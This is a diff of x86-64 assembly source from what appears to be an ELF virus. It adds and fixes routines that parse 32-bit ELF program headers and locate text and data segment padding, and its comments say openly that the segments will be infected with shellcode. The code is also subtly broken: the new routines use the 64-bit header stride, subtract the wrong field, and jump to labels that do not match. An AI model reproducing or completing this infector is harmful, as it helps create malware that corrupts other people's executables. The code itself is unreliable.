@@ -1371,6 +1371,7 @@ parse32elf:
 	pad_text32:
 	pad_done32:
 	mov r10d, eax; contains pad
+	mov rax, QWORD[rsp]
 	call parse32elfheader
 	add rsp, 8
 retn
@@ -1388,7 +1389,8 @@ has_data_seg32:
 	xor rax, rax
 	mov bx,  WORD[rdi + 44]
 	mov WORD[rsp], bx; e_phnum stored
-	mov rbx, QWORD[rdi + 28]
+	xor rbx, rbx
+	mov ebx, DWORD[rdi + 28]
 	add rdi, rbx; rdi now point to e_phoff
 	mov rbx, rdi; swap rdi and rsi for syscalls
 	mov rdi, rsi
@@ -1496,7 +1498,8 @@ find_new_entry32:
 	xor rax, rax
 	mov bx,  WORD[rdi + 44]
 	mov WORD[rsp], bx; e_phnum stored
-	mov rbx, QWORD[rdi + 28]
+	xor rbx, rbx
+	mov ebx, DWORD[rdi + 28]
 	add rdi, rbx; rdi now point to e_phoff
 	mov rbx, rdi; swap rdi and rsi for syscalls
 	mov rdi, rsi
@@ -1544,7 +1547,8 @@ find_new_entry_text32:
 	xor rax, rax
 	mov bx,  WORD[rdi + 44]
 	mov WORD[rsp], bx; e_phnum stored
-	mov rbx, QWORD[rdi + 28]
+	xor rbx, rbx
+	mov ebx, DWORD[rdi + 28]
 	add rdi, rbx; rdi now point to e_phoff
 	mov rbx, rdi; swap rdi and rsi for syscalls
 	mov rdi, rsi
@@ -1561,13 +1565,109 @@ find_new_entry_text32:
 		cmp DWORD[r9 + 24], 5; phdr.p_flags == (PF_R | PF_E) means text seg, we're gonna infect it
 		jne continue_fnet32
 		;we found the text segment !This is where the shellcode will be
-		mov eax, QWORD[r9 + 20];store p_memsz
-		add rax, QWORD[r9 + 8]; add p_vaddr so this gives us "the end" of the segment
+		mov eax, DWORD[r9 + 20];store p_memsz
+		add eax, DWORD[r9 + 8]; add p_vaddr so this gives us "the end" of the segment
 		continue_fnet32:
 		inc rcx
 		add rdx, 32; rdx += sizeof(Elf64_Phdr)
 		jmp loop_fnet32
 	loop_fnet_exit32: 
+	add rsp, 2
+	
+	pop r9
+	pop rbx
+	pop rcx
+	pop rdx
+	pop rsi
+	pop rdi
+retn
+
+get_data_pad32:
+	push rdi
+	push rsi
+	push rdx
+	push rcx
+	push rbx
+	push r9
+
+	sub rsp, 2; e_phnum
+
+	xor rax, rax
+	mov bx,  WORD[rdi + 44]
+	mov WORD[rsp], bx; e_phnum stored
+	xor rbx, rbx
+	mov ebx, DWORD[rdi + 28]
+	add rdi, rbx; rdi now point to e_phoff
+	mov rbx, rdi; swap rdi and rsi for syscalls
+	mov rdi, rsi
+	mov rsi, rbx
+
+	xor rcx, rcx
+	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	loop_gdp32: 
+		cmp cx, WORD[rsp]
+		jge loop_gdp_exit
+		lea r9, [rsi+rdx]; current phdr
+		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
+		jne continue_gdp
+		cmp DWORD[r9 + 24], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
+		jne continue_gdp
+		mov eax, DWORD[r9 + 20];p_memsz
+		sub eax, DWORD[r9 + 8]; - p_filesz
+		;data_seg found !
+		continue_gdp32:
+		inc rcx
+		add rdx, 56; rdx += sizeof(Elf64_Phdr)
+		jmp loop_gdp32
+	loop_gdp_exit32: 
+	add rsp, 2
+	
+	pop r9
+	pop rbx
+	pop rcx
+	pop rdx
+	pop rsi
+	pop rdi
+retn
+
+get_text_pad32:
+	push rdi
+	push rsi
+	push rdx
+	push rcx
+	push rbx
+	push r9
+
+	sub rsp, 2; e_phnum
+
+	xor rax, rax
+	mov bx,  WORD[rdi + 44]
+	mov WORD[rsp], bx; e_phnum stored
+	xor rbx, rbx
+	mov ebx, DWORD[rdi + 28]
+	add rdi, rbx; rdi now point to e_phoff
+	mov rbx, rdi; swap rdi and rsi for syscalls
+	mov rdi, rsi
+	mov rsi, rbx
+
+	xor rcx, rcx
+	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	loop_gtp32: 
+		cmp cx, WORD[rsp]
+		jge loop_gtp_exit32
+		lea r9, [rsi+rdx]; current phdr
+		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
+		jne continue_gtp32
+		cmp DWORD[r9 + 24], 5; phdr.p_flags == (PF_R | PF_E) means text seg, we're gonna infect it
+		jne continue_gtp32
+		mov eax, DWORD[r9 + 20];p_memsz
+		sub eax, DWORD[r9 + 8]; - p_filesz
+		;data_seg found !
+		continue_gtp32:
+		inc rcx
+		add rdx, 56; rdx += sizeof(Elf64_Phdr)
+		jmp loop_gtp32
+	loop_gtp_exit32: 
 	add rsp, 2
 	
 	pop r9
